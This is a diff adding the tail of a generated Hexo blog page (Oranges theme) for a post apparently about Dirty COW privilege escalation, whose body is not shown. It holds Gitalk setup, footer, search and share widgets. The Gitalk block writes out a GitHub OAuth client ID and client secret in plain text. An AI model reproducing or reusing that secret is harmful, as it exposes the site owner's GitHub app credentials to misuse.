+        clientID: '94b011918fa9c2f8b107',
+        clientSecret: '10c1ce2d3cc22cc3586cb5ce5f7b322f1ebc1c6d',
+        repo: '1y0ng.github.io',
+        owner: '1y0ng',
+        admin: ['1y0ng'],
+        id: location.pathname,
+        distractionFreeMode: false
+      })
+
+      gitalk.render('gitalk-container')
+    }
+  </script>
+  
+    <link rel="stylesheet" href="/plugins/gitalk.css">
+    <script type="text/javascript" src="/plugins/gitalk.min.js" onload="loadGitalkSuc(this)"></script>
+  
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2024 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + linux%E6%8F%90%E6%9D%83%E4%B9%8Bdirtycow + '&url=' + http%3A%2F%2Fexample.com%2Fpost%2F2023%2Flinux%25E6%258F%2590%25E6%259D%2583%25E4%25B9%258Bdirtycow%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/post/2023/linux%E6%8F%90%E6%9D%83%E4%B9%8Bdirtycow/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
